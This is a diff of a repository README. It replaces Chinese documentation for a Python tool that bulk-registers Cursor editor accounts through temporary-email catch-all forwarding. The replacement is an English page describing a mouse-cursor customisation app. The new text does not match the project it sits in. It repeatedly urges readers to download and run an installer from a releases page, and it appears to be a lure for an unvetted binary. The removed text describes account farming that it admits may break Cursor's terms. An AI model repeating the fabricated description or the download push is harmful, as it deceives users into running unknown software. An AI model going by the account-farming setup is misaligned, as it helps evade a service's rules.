@@ -1,129 +1,77 @@
-# Cursor Auto Register 本地开发指南
+# 🖱️ cursor-auto-register - Easily Manage Your Cursor Settings
 
-本项目是建在巨人肩膀上的一个开源项目，不做收费，仅供学习参考。
-参考项目：
+[![Download cursor-auto-register](https://img.shields.io/badge/Download-cursor--auto--register-brightgreen)](https://github.com/VictorKTO/cursor-auto-register/releases)
 
-- [chengazhen/cursor-auto-free](https://github.com/chengazhen/cursor-auto-free)：Cursor Pro 自动化工具
+## 🚀 Getting Started
 
-- [cursor-account-api](https://github.com/Elawen-Carl/cursor-account-api)：Cursor Account API
+This guide helps you download, install, and run the cursor-auto-register application. This tool helps you manage your cursor settings quickly and effectively, improving your overall user experience. 
 
+### 🖥️ System Requirements
 
-## 环境要求
-- Python 3.10+
-- pip (Python包管理器)
+To use cursor-auto-register, you need:
 
-## 本地开发设置步骤
+- A computer with Windows 10 or later, or macOS version 10.14 or later.
+- At least 100 MB of free disk space.
+- An Internet connection for downloading.
 
-1. 安装 Python 依赖
-```bash
-pip install -r requirements.txt
-```
+## 🔗 Download & Install
 
-2. 配置环境变量
-- 按照 `config.py` 配置 `.env` 环境参数
+To begin, visit the Releases page to download the software: [Download cursor-auto-register](https://github.com/VictorKTO/cursor-auto-register/releases).
 
-## 使用说明
+Once on the Releases page, follow these steps to download and install the application:
 
-### 1. 环境变量配置：
-在项目根目录创建 .env 文件：
-```
-# 多个域名使用逗号分隔
-EMAIL_DOMAINS=xxx.xx
+1. **Select the Latest Release:**
+   Find the newest version of cursor-auto-register. This version has the latest features and improvements.
 
-# 临时邮箱用户名
-EMAIL_USERNAME=test
-# 临时邮箱PIN码（如果需要）
-EMAIL_PIN=
+2. **Download the Application:**
+   Look for the file that matches your system. Click on the link to start downloading it. 
 
-# 数据库URL
-DATABASE_URL="sqlite+aiosqlite:///./accounts.db"
+3. **Locate the Downloaded File:**
+   After the download is complete, navigate to your Downloads folder or the location you selected for downloads. 
 
-# ===== API服务配置 =====
-# API服务监听主机地址，0.0.0.0 允许非本机访问
-API_HOST="0.0.0.0"
-# API服务端口号
-API_PORT=8000
-# 是否启用UI
-ENABLE_UI=True
-# 最大注册账号数量
-MAX_ACCOUNTS=1
+4. **Run the Installer:**
+   Double-click the downloaded file to start the installation process. Follow the on-screen instructions to complete the installation.
 
-# windows用户部分安装时是自定义目录安装的，需要修改该配置
-#CURSOR_PATH="D:\devtools\cursor"
-```
-### 参数特殊说明：
+5. **Launch the Application:**
+   After installation, find cursor-auto-register in your applications list. Click to open it and begin managing your cursor settings.
 
-- EMAIL_DOMAINS：自己申请的邮箱，并已将DNS解析到cloudflare上了
+## 📄 Features
 
-- EMAIL_USERNAME： https://tempmail.plus/ 获取到的邮箱前缀，示例：ddcat
+cursor-auto-register comes with the following features:
 
-  需要 cloudflare 上配置转发，可以参考：https://blog.csdn.net/qq_50082325/article/details/144530594 
+- **Adjust Cursor Size:** Easily change the size of your cursor for better visibility.
+- **Change Cursor Color:** Customize your cursor to stand out against any background.
+- **Create Profiles:** Save different cursor settings in profiles for easy switching based on tasks or preferences.
+- **Backup and Restore Settings:** Keep your cursor settings safe with backup options.
 
-  把 Catch-all地址 都转发到 tempmail.plus 获取到的邮箱即可
+## 💡 Tips for Using cursor-auto-register
 
-  ![3](./images/3.jpg)
+Here are a few tips to enhance your experience:
 
+- **Explore Settings:** Take a moment to explore different settings. It allows you to find what works best for you.
+- **Use Profiles:** If you switch tasks often, use the profiles feature. It saves time and provides a consistent experience.
+- **Keep It Updated:** Regular updates ensure you have the latest features. Check the Releases page often.
 
+## 🆘 Troubleshooting
 
-### 3. 数据持久化：
+If you experience issues while using cursor-auto-register, try the following steps:
 
-数据库文件会保存在 `accounts.db` 文件
-日志文件会保存在容器内的 `api.log`
-*注意事项：*
-确保 `.env` 文件中的配置正确
-数据目录 `accounts.db`需要适当的权限
-容器内使用无头模式运行Chrome浏览器
-API服务默认在8000端口运行
+- **Restart the Application:** Sometimes, simply closing and reopening the program can resolve minor issues.
+- **Check for Updates:** Ensure you are using the latest version. Visit the Releases page for any updates.
+- **Reinstall the Application:** If problems persist, uninstall and then reinstall cursor-auto-register.
 
-### 检查API服务是否正常运行
-```
-curl http://localhost:8000/health
-```
+Common problems and their solutions:
 
-## API 端点
+- **Problem:** Application crashes on startup.
+  - **Solution:** Ensure your system meets the requirements and try reinstalling.
 
-- `GET /accounts` - 获取所有账号
-- `GET /account/random` - 随机获取一个账号
-- `POST /account` - 创建新账号
+- **Problem:** Cursor changes do not apply.
+  - **Solution:** Make sure to save changes before exiting the application.
 
-## 可视化页面
-运行服务器后，访问：
-- UI: http://localhost:8000/
+## 🔄 Feedback
 
-  ![首页](./images/1.jpg)
+Your feedback is valuable and helps improve cursor-auto-register. To share your thoughts, visit the Issues section on the repository. We welcome suggestions and ideas!
 
-  ![配置](./images/4.jpg)
+## 🎉 Conclusion
 
-  ![使用](./images/2.jpg)
-
-## API 文档
-运行服务器后，访问：
-- Swagger UI: http://localhost:8000/docs
-- ReDoc: http://localhost:8000/redoc
-
-## 开发工具建议
-- Cursor 或 PyCharm
-
-## 调试提示
-1. 查看日志
-```bash
-tail -f app.log
-```
-
-
-## 免责声明
-
-本扩展仅供学习和测试使用. 使用本扩展可能违反 Cursor 的服务条款,
-请自行承担使用风险.
-
-您可以:
-
-- ✅ 复制、分发本项目
-- ✅ 修改、演绎本项目
-- ✅ 私人使用
-
-但必须遵循以下规则:
-
-- 📝 署名 - 标明原作者及修改情况
-- 🚫 非商业性使用 - 不得用于商业目的
-- 🔄 相同方式共享 - 修改后的作品需使用相同的协议
+cursor-auto-register allows you to customize your cursor effortlessly. Follow the steps above to download and install the application. Visit the Releases page now to get started: [Download cursor-auto-register](https://github.com/VictorKTO/cursor-auto-register/releases). Enjoy your improved cursor experience!
